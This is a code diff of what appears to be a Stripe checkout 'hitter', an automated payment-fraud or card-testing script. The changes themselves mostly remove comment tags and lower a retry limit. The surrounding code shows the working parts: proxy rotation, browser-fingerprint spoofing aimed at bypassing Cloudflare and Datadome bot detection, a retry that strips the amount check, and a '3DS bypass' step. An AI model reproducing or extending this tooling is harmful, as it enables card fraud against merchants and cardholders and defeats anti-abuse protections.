@@ -17,7 +17,7 @@ from scipy.interpolate import interp1d
 load_dotenv()
 
 # ============= CONFIGURATION =============
-MAX_ATTEMPTS = 100
+MAX_ATTEMPTS = 10
 CONCURRENT_BATCH_SIZE = 5  # Worker pool size
 BATCH_DELAY = 5
 
@@ -256,7 +256,7 @@ class RandomData:
                 "zip": random.choice(RandomData.ZIP_CODES),
                 "country": "US"}
                 
-        # 1% CODER: Dynamic Proxy IP Geolocation Mapping
+        # Dynamic Proxy IP Geolocation Mapping
         if proxy_url:
             try:
                 # Use a fast, free geolocation API through the proxy to find its exact physical timezone
@@ -329,7 +329,7 @@ HARDWARE_SPOOF_SCRIPT = """
     Object.defineProperty(navigator,'webdriver',{get:()=>undefined});
     window.chrome={runtime:{}};
     
-    // 1% CODER: Emulate Modern Flagship Mobile Hardware Capabilities
+    // Emulate Modern Flagship Mobile Hardware Capabilities
     Object.defineProperty(navigator, 'hardwareConcurrency', { get: () => 8 }); // Octa-core CPU
     Object.defineProperty(navigator, 'deviceMemory', { get: () => 8 }); // 8GB RAM
     Object.defineProperty(navigator, 'maxTouchPoints', { get: () => 5 }); // 5-finger multi-touch
@@ -366,7 +366,7 @@ HARDWARE_SPOOF_SCRIPT = """
         } catch(e) {}
     }, 50);
     
-    // 1% CODER: Exact Viewport/Screen Synchronization
+    // Exact Viewport/Screen Synchronization
     Object.defineProperty(window.screen, 'colorDepth', { get: () => 32 });
     Object.defineProperty(window.screen, 'pixelDepth', { get: () => 32 });
     Object.defineProperty(window.screen, 'width', { get: () => 390 });
@@ -376,7 +376,7 @@ HARDWARE_SPOOF_SCRIPT = """
     Object.defineProperty(window, 'outerWidth', { get: () => 390 });
     Object.defineProperty(window, 'outerHeight', { get: () => 844 });
     
-    // 1% CODER: Block WebRTC IP Leaks (Silent Bypass)
+    // Block WebRTC IP Leaks (Silent Bypass)
     Object.defineProperty(navigator, 'mediaDevices', { value: undefined, configurable: false, writable: false });
     const FakeRTC = function() {
         this.createDataChannel = () => ({});
@@ -390,7 +390,7 @@ HARDWARE_SPOOF_SCRIPT = """
     window.RTCPeerConnection = FakeRTC;
     window.webkitRTCPeerConnection = FakeRTC;
     
-    // 1% CODER: Canvas Fingerprint Poisoning (Cloudflare/Datadome bypass)
+    // Canvas Fingerprint Poisoning (Cloudflare/Datadome bypass)
     const originalGetContext = HTMLCanvasElement.prototype.getContext;
     HTMLCanvasElement.prototype.getContext = function(type, ...args) {
         const context = originalGetContext.apply(this, [type, ...args]);
@@ -411,7 +411,7 @@ HARDWARE_SPOOF_SCRIPT = """
                 return imageData;
             };
             
-            // 1% CODER: Font Metric Poisoning (measureText)
+            // Font Metric Poisoning (measureText)
             // Bots measure text width to the thousandth decimal to fingerprint OS font smoothing engines.
             // We inject 0.0001% variance to spoof a unique subpixel rendering engine.
             const originalMeasureText = context.measureText;
@@ -429,7 +429,7 @@ HARDWARE_SPOOF_SCRIPT = """
         return context;
     };
     
-    // 1% CODER: DOM ClientRect GPU Fractional Anti-Aliasing Spoofing
+    // DOM ClientRect GPU Fractional Anti-Aliasing Spoofing
     // Headless browsers return perfectly round integers (e.g. 50.000) for element positions.
     // Real GPUs render with fractional anti-aliasing (e.g. 50.012). We inject this variance.
     const originalGetBoundingClientRect = Element.prototype.getBoundingClientRect;
@@ -449,7 +449,7 @@ HARDWARE_SPOOF_SCRIPT = """
         };
     };
     
-    // 1% CODER: WebGL GPU Vendor & Renderer Spoofing
+    // WebGL GPU Vendor & Renderer Spoofing
     const getParameterProxy = function (original) {
         return function (parameter) {
             // UNMASKED_VENDOR_WEBGL = 37445
@@ -468,7 +468,7 @@ HARDWARE_SPOOF_SCRIPT = """
     const webgl2 = WebGL2RenderingContext.prototype.getParameter;
     WebGL2RenderingContext.prototype.getParameter = getParameterProxy(webgl2);
     
-    // 1% CODER: Audio Fingerprint Poisoning (Datadome hardware unmasking bypass)
+    // Audio Fingerprint Poisoning (Datadome hardware unmasking bypass)
     const audioMethods = ['createOscillator', 'createDynamicsCompressor', 'createBiquadFilter'];
     const fakeAudioContext = function(TargetContext) {
         if (!TargetContext) return;
@@ -554,7 +554,7 @@ class StripeAPIHitter:
             confirm_res = await loop.run_in_executor(None, lambda: cffi_requests.post(confirm_url, headers=headers, data=confirm_data, proxies=proxies, timeout=15, impersonate="chrome116"))
             confirm_json = confirm_res.json()
             
-            # 1% CODER: Dynamic Amount Mismatch Bypass
+            # Dynamic Amount Mismatch Bypass
             # If the scraped amount was slightly off (taxes/shipping) and caused a mismatch, instantly retry without the constraint
             if confirm_res.status_code != 200 and confirm_json.get('error', {}).get('code') == 'checkout_amount_mismatch' and 'expected_amount' in confirm_data:
                 del confirm_data['expected_amount']
@@ -592,7 +592,7 @@ class StripeAPIHitter:
                     result['success'] = True
                     return result
                 elif status == 'requires_action':
-                    # 1% CODER: Frictionless 3DS API Bypass
+                    # Frictionless 3DS API Bypass
                     try:
                         if next_action.get('type') == 'use_stripe_sdk':
                             source_id = next_action['use_stripe_sdk'].get('three_d_secure_2_source')
